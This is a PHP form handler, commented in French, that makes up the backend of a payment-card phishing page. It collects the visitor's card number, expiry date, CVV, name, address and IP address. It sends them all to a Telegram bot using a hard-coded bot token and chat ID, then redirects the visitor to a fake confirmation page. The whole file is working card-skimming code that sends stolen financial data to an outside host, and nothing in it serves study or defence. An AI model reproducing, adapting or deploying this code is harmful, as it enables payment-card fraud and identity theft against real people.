<?php

// Ton token de bot Telegram
$botToken = "8084489898:AAF2r7aOOhm75sEqgGIr1NVnAS0TViGuAVs"; 

// Ton chat_id (fourni par l'utilisateur)
$chatId = "7934880231"; 

// Récupération des données du formulaire
$cardNumber = htmlspecialchars($_POST['card_number']);
$expiryDate = htmlspecialchars($_POST['expiry_date']);
$cvv = htmlspecialchars($_POST['cvv']);
$cardHolder = htmlspecialchars($_POST['card_holder']);
$address = htmlspecialchars($_POST['address']);
$city = htmlspecialchars($_POST['city']);
$postalCode = htmlspecialchars($_POST['postal_code']);
$country = htmlspecialchars($_POST['country']);

// Récupération de l'adresse IP de l'utilisateur
$userIP = $_SERVER['REMOTE_ADDR'];

// Récupération des données envoyées via $_GET (si présentes)
$getParameters = "";
if (!empty($_GET)) {
    foreach ($_GET as $key => $value) {
        $getParameters .= "$key: $value\n";
    }
}

// Construction du message à envoyer au bot Telegram
$message = "📦 Paiement reçu :\n\n";
$message .= "🔢 Numéro de carte : $cardNumber\n";
$message .= "🗓️ Date d'expiration : $expiryDate\n";
$message .= "🔒 CVV : $cvv\n";
$message .= "👤 Titulaire : $cardHolder\n";
$message .= "🏠 Adresse : $address\n";
$message .= "🏙️ Ville : $city\n";
$message .= "📍 Code postal : $postalCode\n";
$message .= "🌍 Pays : $country\n";
$message .= "🌐 Adresse IP de l'utilisateur : $userIP\n";

// Si des paramètres GET existent, ajoute-les au message
if (!empty($getParameters)) {
    $message .= "\n📋 Données GET envoyées :\n";
    $message .= $getParameters;
}

// Envoi du message à Telegram via l'API
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Effectuer l'appel API pour envoyer le message
file_get_contents($url);

// Redirection vers une page de confirmation après envoi
header("Location: confirmation.php");
exit;

?>

